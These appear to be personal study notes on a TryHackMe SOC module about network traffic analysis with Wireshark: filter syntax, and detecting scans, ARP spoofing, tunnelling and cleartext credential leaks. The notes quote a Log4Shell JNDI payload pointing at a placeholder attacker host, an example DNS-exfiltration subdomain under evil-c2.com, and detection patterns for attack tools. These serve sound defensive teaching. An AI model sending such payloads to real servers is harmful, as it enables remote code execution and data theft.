# TryHackMe SOC Level 1 — Network Traffic Analysis

This module is about reading what actually happened on the wire. Logs tell you a connection occurred, and packets show you what was inside it. It starts with where traffic comes from and how to capture it, then goes deep on Wireshark: navigating a capture, filtering it down, and spotting scans, spoofing, tunnelling and leaked credentials.

**Rooms:** Network Traffic Basics · Wireshark: The Basics · Wireshark: Packet Operations · Wireshark: Traffic Analysis · NetworkMiner

> This file covers the first four rooms. NetworkMiner is still to come.

**Skills covered:** TCP/IP layers · north-south vs. east-west traffic · logs vs. PCAP vs. NetFlow · Wireshark UI & packet dissection · display filter syntax · statistics · scan & ARP spoofing detection · host identification · DNS/ICMP tunnelling · FTP/HTTP analysis · TLS decryption · credential hunting

---

## Network Traffic Basics

**Why NTA (network traffic analysis):** some attacks barely show up in host logs but are obvious on the network. The room's example is malware **beaconing** to C2 and exfiltrating data through **DNS tunnelling**: the endpoint looks quiet, but the DNS traffic is full of long, random-looking subdomains sent at a steady rhythm.

### What each layer shows you
| TCP/IP layer | What you can observe | Example |
|---|---|---|
| Application | Protocol content: URLs, DNS queries, credentials, files | `GET /admin.php`, `pass=...` |
| Transport | Ports, TCP flags, sessions | SYN to many ports = scan |
| Internet | Source/destination IPs, TTL | Who talked to whom |
| Link | MAC addresses, ARP | Duplicate MAC for one IP = spoofing |

### Sources & flows
- **Endpoint sources:** the hosts and servers that generate traffic. **Intermediary sources:** firewalls, proxies, routers, and anything else traffic passes through
- **North-south:** traffic crossing the perimeter, internal ↔ internet (e.g. HTTPS browsing, external DNS)
- **East-west:** internal ↔ internal (e.g. SMB with Kerberos between a workstation and a file server). This is where **lateral movement** shows up, and perimeter tools never see it

### Three ways to observe traffic
| Source | What you get | Trade-off |
|---|---|---|
| **Logs** (firewall, proxy, DNS) | Summarized events | Cheap, but no payload |
| **Full packet capture (PCAP)** | Every byte | Complete, but huge storage cost |
| **Flow stats (NetFlow / IPFIX)** | Who, when, how much (5-tuple + byte counts) | Good for spotting exfil volume or beaconing, no content |

**Capturing:** use a **network TAP** (a hardware device that copies traffic off the cable) or **port mirroring / SPAN** (the switch copies a port's traffic to the sensor).

---

## Wireshark: The Basics

Wireshark is an open-source packet analyzer for capturing traffic and inspecting PCAPs. **It isn't an IDS:** it won't alert you, it just lets you look.

### The interface
1. **Packet List:** one row per packet (No., Time, Source, Destination, Protocol, Length, Info)
2. **Packet Details:** the selected packet broken down by layer
3. **Packet Bytes:** raw hex/ASCII. Clicking a field in Details highlights its bytes here

The **status bar** shows the total packets and how many are currently displayed.

### Packet dissection (top → bottom of Details)
```
Frame        → metadata: arrival time, length            (layer 1)
Ethernet II  → source/dest MAC                           (layer 2)
IPv4         → source/dest IP, TTL                       (layer 3)
TCP/UDP      → ports, flags, seq/ack numbers             (layer 4)
Protocol     → HTTP, DNS, FTP... the actual content      (layer 5–7)
```

### Basic navigation & features
- **Go to packet:** `Ctrl+G` · **Find packet:** `Ctrl+F` (search *Display filter*, *Hex*, *String* or *Regex* in the list, details or bytes)
- **Mark packets** (`Ctrl+M`) to highlight them. Marks are lost when the file closes
- **Packet comments:** saved inside the file, so useful for leaving notes in a PCAP
- **Export Specified Packets:** save only the filtered packets into a smaller PCAP
- **File → Export Objects → HTTP / SMB / TFTP / IMF / DICOM:** pull transferred files out of the capture
- **View → Time Display Format:** switch to UTC date/time instead of "seconds since capture start"
- **Analyze → Expert Information:** Wireshark's own warnings (Chat / Note / Warn / Error), e.g. malformed packets, retransmissions
- **Coloring rules:** default colours for protocols and errors (green = TCP/HTTP, light blue = UDP, black = errors). You can add your own

### Filtering basics
- **Right-click → Apply as Filter:** builds a filter from the selected field
- **Conversation Filter:** shows only the traffic between those two endpoints
- **Prepare as Filter:** adds the filter to the bar without applying it
- **Apply as Column:** turns a field (e.g. `http.user_agent`) into a column in the packet list
- **Follow → TCP/UDP/HTTP Stream:** rebuilds the whole conversation as text (red = client, blue = server)

---

## Wireshark: Packet Operations

### Statistics menu
| Tool | Use |
|---|---|
| **Resolved Addresses** | IPs and hostnames found in the capture |
| **Protocol Hierarchy** | Breakdown of protocols by share of traffic. Quickly reveals unexpected ones |
| **Conversations** | Every endpoint pair with packet and byte counts, per layer (Ethernet / IPv4 / TCP / UDP) |
| **Endpoints** | Each unique host, with MAC → vendor resolution and GeoIP (needs the MaxMind DB) |
| **IPv4/IPv6 Statistics** | All addresses and destinations/ports |
| **DNS / HTTP** | Query and response codes, request methods, status codes, user agents |

**Name resolution** (View → Name Resolution): MAC → vendor and IP → hostname. IP resolution is off by default because it generates DNS lookups of its own.

### Capture filters vs. display filters
| | Capture filter (BPF) | Display filter |
|---|---|---|
| When | Before capturing. Anything dropped is gone for good | After, on a loaded capture |
| Syntax | `tcp port 80`, `host 10.0.0.5` | `tcp.port == 80`, `ip.addr == 10.0.0.5` |

### Display filter syntax
| Operator | Meaning |
|---|---|
| `==` `eq` / `!=` `ne` | equal / not equal |
| `>` `gt` / `<` `lt` / `>=` `ge` / `<=` `le` | comparisons |
| `&&` `and` / `\|\|` `or` / `!` `not` | logic |
| `contains` | case-sensitive substring match |
| `matches` | regex, case-insensitive (`http.host matches "\.(php\|html)"`) |
| `in {...}` | set membership (`tcp.port in {80 443 8080}`) |
| `upper()` / `lower()` / `string()` | functions (`lower(http.server) contains "apache"`) |

**Filter bar colours:** green = valid, red = invalid, yellow = valid but might not do what you expect (often a `!=` gotcha).

> **The `!=` trap:** `ip.addr != 10.0.0.5` still matches packets *to or from* 10.0.0.5, because `ip.addr` checks both source and destination and the other one isn't 10.0.0.5. Use `!(ip.addr == 10.0.0.5)` instead.

**Common filters:**
```
ip.addr == 10.10.10.111           # src OR dst
ip.src == 10.10.10.0/24           # subnet as source
tcp.port == 80 || udp.port == 53
http.response.code == 200
dns.flags.response == 0           # DNS queries only
http.request.method == "POST"
frame contains "password"         # search raw frame bytes
```

**Bookmarks & profiles:** save frequently used filters as bookmarks or filter buttons. **Configuration profiles** (Edit → Configuration Profiles) store separate column, colour and filter setups, e.g. one profile for web analysis and one for malware traffic.

---

## Wireshark: Traffic Analysis

### Nmap scans
| Scan | Pattern | Filter |
|---|---|---|
| **TCP Connect** (`-sT`, non-root) | Full handshake. Window size usually > 1024 | `tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024` |
| **SYN / half-open** (`-sS`, root) | SYN → SYN/ACK → **RST** (never finishes the handshake). Window ≤ 1024 | `tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <= 1024` |
| **UDP** (`-sU`) | Closed port → ICMP *port unreachable*. Open port → no reply | `icmp.type==3 and icmp.code==3` |

Flag value shortcuts: `tcp.flags == 2` SYN · `18` SYN+ACK · `20` RST+ACK · `16` ACK. Window size is only a heuristic, so confirm by following the conversation.

### ARP poisoning / MITM
ARP has **no authentication**, so an attacker can reply "10.0.0.1 is at *my* MAC" and the victim believes it.
**Signs:** two MACs claiming the same IP, a flood of ARP requests from one MAC, and gratuitous replies nobody asked for.
```
arp.opcode == 1                     # requests (2 = replies)
arp.duplicate-address-detected      # Wireshark's own spoofing warning
eth.addr == <attacker MAC> and http and urlencoded-form   # what the MITM captured
```
**Why filter by MAC and not IP:** in a MITM the victim's traffic still has the *real* destination IP, but it's sent to the attacker's MAC. Only the MAC shows whose machine the packets passed through. (This is the `eth.dst == ... && urlencoded-form.key == "pass"` question.)

### Identifying hosts
| Protocol | Filter | Gives you |
|---|---|---|
| **DHCP** | `dhcp.option.hostname contains "x"` | Hostname (opt 12), requested IP (50), lease (51), client MAC (61). Message types: 3 Request, 5 ACK, 6 NAK |
| **NetBIOS** | `nbns.name contains "x"` | Windows hostnames (opcode 5 = registration) |
| **Kerberos** | `kerberos.CNameString and !(kerberos.CNameString contains "$")` | **Usernames** and domain/realm. A trailing `$` = machine account |

Together these answer "which user, on which hostname, had this IP at this time?", which every alert needs.

### Tunnelling (DNS & ICMP)
Attackers hide C2 or exfil inside protocols that firewalls usually let through.
```
data.len > 64 and icmp              # ICMP with a suspiciously large payload
dns.qry.name.len > 15 and !mdns     # long DNS queries (raise threshold to cut noise)
dns contains "dnscat"               # known tool signature
```
**Example:** `aGVsbG8gZnJvbSB0aGUgaW5zaWRl.data.evil-c2.com` is a base64 chunk carried as a subdomain. Hundreds of these to one domain = DNS tunnelling.

### FTP (cleartext)
| Code | Meaning |
|---|---|
| 220 | Service ready |
| 230 | Login successful |
| 331 | Username OK, need password |
| **530** | **Login failed** |
| 227 / 228 | Entering passive mode |
| 211–213 | System/directory/file status |
```
ftp.response.code == 530                                     # failed logins → brute force?
(ftp.request.command == "PASS") and (ftp.request.arg == "password")   # password spraying
ftp.request.command == "STOR"                                # uploads
```
**Brute force vs. spraying:** lots of 530s for *one* user = brute force. One password tried across *many* users = spraying. Follow the TCP stream to read the whole session (USER, PASS, CWD, LIST, STOR, SITE CHMOD).

### HTTP (cleartext)
```
http.request.method == "POST"
http.user_agent contains "nmap"  ||  http.user_agent contains "sqlmap"
http.request.uri contains "admin"
(frame contains "jndi") or (frame contains "Exploit")        # Log4Shell
```
**User-agent red flags:** one host using several different UAs within minutes, misspelled browser names ("Mozlila"), tool names (Nmap, sqlmap, Wfuzz), or payload characters (`$`, `==`) in the UA string.
**Log4j (Log4Shell, CVE-2021-44228):** `${jndi:ldap://attacker/a}` sent in a header or POST body makes the server fetch and run attacker code.

### Decrypting HTTPS
Without the session keys you only see the handshake:
```
tls.handshake.type == 1     # Client Hello: SNI shows the domain requested
tls.handshake.type == 2     # Server Hello
```
With a **key log file** (browsers write one if the `SSLKEYLOGFILE` env variable is set):
**Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename** → the traffic decrypts to `http2`, and Export Objects works on it.

### Bonus: credentials & acting on results
- **Tools → Credentials:** lists cleartext creds Wireshark's dissectors found (FTP, HTTP incl. Basic Auth, IMAP, POP, SMTP), with packet numbers you can click. **Verify them by hand:** typos and brute-force attempts appear as "credentials" too.
- **Tools → Firewall ACL Rules:** generates block rules from the selected packet (by IP, port or MAC) for iptables, Cisco IOS, ipfw, pf or Windows `netsh`. This is how you go from a finding to containment:
```
iptables -A INPUT -i eth0 -s 10.121.70.151/32 -j DROP
```

**Takeaway:** Wireshark answers *what exactly happened*, but you need a hypothesis first. The usual workflow is **Statistics → narrow with filters → Follow Stream → extract IOCs → act.**
